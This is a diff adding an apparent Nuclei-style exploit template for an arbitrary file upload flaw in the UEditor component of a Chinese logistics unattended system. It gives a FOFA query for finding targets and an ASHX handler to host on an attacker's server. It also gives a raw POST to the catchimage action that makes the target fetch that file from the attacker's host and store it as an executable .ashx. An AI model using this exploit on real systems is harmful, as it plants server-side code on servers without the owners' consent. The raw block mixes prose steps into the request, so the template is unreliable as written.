@@ -1,0 +1,74 @@
+id: poc-zfnvddbuaccsp38q
+info:
+  name: 易思智能物流无人值守系统ueditor任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zfnvddbuaccsp38q'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zfnvddbuaccsp38q
+    fofa: '"智能物流无人值守系统"'
+http:
+- raw:
+  - '1.新建文件1.png
+
+    <% @ webhandler language="C#" class="AverageHandler" %>
+
+
+    using System;
+
+    using System.Web;
+
+
+    public class AverageHandler : IHttpHandler
+
+    {
+
+    public bool IsReusable
+
+    { get { return true; } }
+
+    public void ProcessRequest(HttpContext ctx)
+
+    {
+
+    ctx.Response.Write("hello");
+
+    }
+
+    }
+
+
+    2.上传vps启用http服务，并使用如下poc上传文件
+
+    POST /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    source[]=http://ip:8888/1.png?.ashx
+
+
+    返回包上传位置
+
+    http://ip/upload/image/20240626/6385496269130997612204175.ashx'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
